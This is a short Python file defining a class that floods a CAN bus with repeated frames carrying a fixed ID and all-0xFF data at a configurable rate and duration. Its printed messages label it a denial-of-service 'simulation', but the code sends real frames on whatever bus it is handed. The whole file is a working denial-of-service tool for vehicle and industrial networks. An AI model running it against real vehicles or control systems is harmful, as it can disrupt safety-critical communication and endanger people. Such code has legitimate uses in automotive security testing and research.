import time
import can


class DoSAttack:

    def __init__(
        self,
        can_bus,
        can_id=0x123,
        rate=100,
        duration=10
    ):

        self.can_bus = can_bus
        self.can_id = can_id
        self.rate = rate
        self.duration = duration



    def generate_payload(self):

        return [
            0xFF,
            0xFF,
            0xFF,
            0xFF,
            0xFF,
            0xFF,
            0xFF,
            0xFF
        ]



    def start(self):

        print("[+] DoS Attack Simulation Started")

        print(
            f"[+] CAN ID: 0x{self.can_id:X}"
        )

        print(
            f"[+] Rate: {self.rate} msg/sec"
        )


        delay = 1 / self.rate

        start_time = time.time()

        message_count = 0


        while time.time() - start_time < self.duration:

            message = can.Message(

                arbitration_id=self.can_id,

                data=self.generate_payload(),

                is_extended_id=False

            )


            self.can_bus.send(
                message
            )


            message_count += 1


            time.sleep(delay)



        print("[+] DoS Simulation Completed")

        print(
            f"[+] Total Messages Sent: {message_count}"
        )